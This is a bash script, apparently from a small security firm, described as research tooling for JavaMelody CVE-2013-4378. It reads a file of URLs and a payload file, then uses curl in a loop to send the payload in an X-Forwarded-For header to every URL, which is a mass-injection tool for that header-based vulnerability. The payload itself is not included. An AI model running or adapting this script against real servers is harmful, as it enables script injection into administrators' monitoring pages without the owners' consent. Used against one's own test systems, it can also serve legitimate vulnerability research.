#!/bin/bash dry-wit
# Copyright 2013-today Automated Computing Machinery S.L.
# Distributed under the terms of the GNU General Public License v3

function usage() {
cat <<EOF
$SCRIPT_NAME [-v[v]] [-q|--quiet] url-list-file payload-file
$SCRIPT_NAME [-h|--help]
(c) 2013-today Automated Computing Machinery S.L.
    Distributed under the terms of the GNU General Public License v3
 
JavaMelody CVE-2013-4378 research script.

Where:
- url-list-file: The list of urls to visit with the payload.
- payload-file: The payload to use.
 
EOF
}
 
# Requirements
function checkRequirements() {
  checkReq curl CURL_NOT_INSTALLED;
}
 
# Environment
function defineEnv() {
  
  ENV_VARIABLES=(\
  );
 
  export ENV_VARIABLES;
}

# Error messages
function defineErrors() {
  export INVALID_OPTION="Unrecognized option";
  export CURL_NOT_INSTALLED="curl not installed";
  export FILE_IS_MANDATORY="file is mandatory";
  export CANNOT_READ_FILE="Cannot read file";
  export PAYLOAD_IS_MANDATORY="payload is mandatory";
  export CANNOT_READ_PAYLOAD="Cannot read payload";

  ERROR_MESSAGES=(\
    INVALID_OPTION \
    CURL_NOT_INSTALLED \
    FILE_IS_MANDATORY \
    CANNOT_READ_FILE \
    PAYLOAD_IS_MANDATORY \
    CANNOT_READ_PAYLOAD \
  );

  export ERROR_MESSAGES;
}
 
# Checking input
function checkInput() {
 
  local _flags=$(extractFlags $@);
  local _flagCount;
  local _currentCount;
  logInfo -n "Checking input";

  # Flags
  for _flag in ${_flags}; do
    _flagCount=$((_flagCount+1));
    case ${_flag} in
      -h | --help | -v | -vv | -q)
         shift;
         ;;
      *) exitWithErrorCode INVALID_OPTION ${_flag};
         ;;
    esac
  done
 
  # Parameters
  if [ "x${URL_FILE}" == "x" ]; then
    URL_FILE="$1";
    shift;
  fi

  if [ "x${URL_FILE}" == "x" ]; then
    logInfoResult FAILURE "fail";
    exitWithErrorCode FILE_IS_MANDATORY;
  fi
 
  if [ ! -e "${URL_FILE}" ]; then
    logInfoResult FAILURE "fail";
    exitWithErrorCode CANNOT_READ_FILE;
  fi

  if [ "x${PAYLOAD_FILE}" == "x" ]; then
    PAYLOAD_FILE="$1";
    shift;
  fi

  if [ "x${PAYLOAD_FILE}" == "x" ]; then
    logInfoResult FAILURE "fail";
    exitWithErrorCode FILE_IS_MANDATORY;
  fi
 
  if [ ! -e "${PAYLOAD_FILE}" ]; then
    logInfoResult FAILURE "fail";
    exitWithErrorCode CANNOT_READ_PAYLOAD;
  fi
  logInfoResult SUCCESS "valid";
}

function main() {

  local _payload="$(cat "${PAYLOAD_FILE}")"

  while read _url; do
    logInfo -n "Accessing ${_url}";
    curl -H "X-Forwarded-For: ${_payload}" "${_url}" -o /dev/null > /dev/null 2>&1
    if [ $? -eq 0 ]; then
      logInfoResult SUCCESS "done";
    else
      logInfoResult FAILURE "failed";
    fi
  done < "${URL_FILE}"
}
